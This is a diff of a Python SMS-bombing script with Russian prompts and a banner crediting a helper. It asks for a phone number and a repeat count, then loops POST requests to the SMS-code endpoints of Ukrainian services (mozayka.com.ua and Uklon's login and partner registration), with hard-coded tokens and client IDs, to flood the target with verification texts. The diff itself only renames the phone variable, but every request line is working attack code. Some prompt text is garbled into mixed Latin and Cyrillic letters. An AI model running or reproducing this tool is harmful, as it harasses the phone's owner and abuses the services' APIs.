@@ -38,7 +38,7 @@ console.print('''[bold red]
 | Человек которий сильно помог - @GGClubbb|
  -----------------------------------------
 ''')
-self.formatted_phone = input('[green]Beeante HOMeP tenedona: (бes + ')
+number = input('[green]Beeante HOMeP tenedona: (бes + ')
 
 
 
@@ -46,16 +46,16 @@ run = int(console.input('[green]Введите количество повтор
 for _ in track(range(run)):
  try:
      print('мазайкааа')
-     requests.post("https://mozayka.com.ua/!processing/ajax.php", headers=headers, data={"phone": "+" + self.formatted_phone, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"})
+     requests.post("https://mozayka.com.ua/!processing/ajax.php", headers=headers, data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"})
  except:
      print('НЕ отправлено мазайка')
  try:
      print('уклон вход')
-     requests.post("https://uklon.com.ua/api/v1/account/code/send", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": self.formatted_phone})
+     requests.post("https://uklon.com.ua/api/v1/account/code/send", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": number})
  except:
      print('Не отправельно уклон вход')
  try:
      print('уклон регастратура')
-     requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": self.formatted_phone})
+     requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode", headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": number})
  except:
      print('Не отправельно уклон регестратура')
